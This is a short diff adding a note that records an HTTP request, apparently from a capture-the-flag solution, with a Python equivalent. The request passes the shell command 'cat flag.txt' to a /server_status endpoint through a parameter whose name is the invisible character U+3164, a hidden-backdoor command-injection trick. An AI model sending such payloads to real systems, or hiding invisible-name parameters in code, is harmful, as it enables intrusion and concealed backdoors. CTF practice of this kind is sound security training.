@@ -1,0 +1,10 @@
+# HTTP request used (urlencoded body; %E3%85%A4 = UTF-8 bytes of U+3164 'ㅤ')
+
+POST /server_status HTTP/1.1
+Host: 154.57.164.75:32093
+Content-Type: application/x-www-form-urlencoded
+
+choice=6&%E3%85%A4=cat%20flag.txt
+
+# Python equivalent:
+#   urllib.parse.urlencode({'choice': '6', '\u3164': 'cat flag.txt'})
